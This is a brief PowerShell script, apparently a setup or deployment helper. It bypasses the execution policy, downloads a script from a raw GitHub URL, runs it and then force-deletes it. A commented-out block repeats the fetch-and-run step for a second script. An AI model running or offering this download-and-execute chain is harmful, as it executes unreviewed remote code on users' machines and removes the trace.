Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass

$scriptPath = "$PSScriptRoot\temp_2.ps1"
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/truongcp0305/dp/main/2.ps1" -OutFile $scriptPath

& $scriptPath

Remove-Item $scriptPath -Force

# Start-Process "https://ncsgroup.vn/"

# Start-Process powershell.exe -ArgumentList @"
# `$scriptPath2 = `"$PSScriptRoot\temp_3.ps1`"
# Invoke-WebRequest -Uri `"https://raw.githubusercontent.com/truongcp0305/dp/main/3.ps1`" -OutFile `$scriptPath2
# & `$scriptPath2
# "@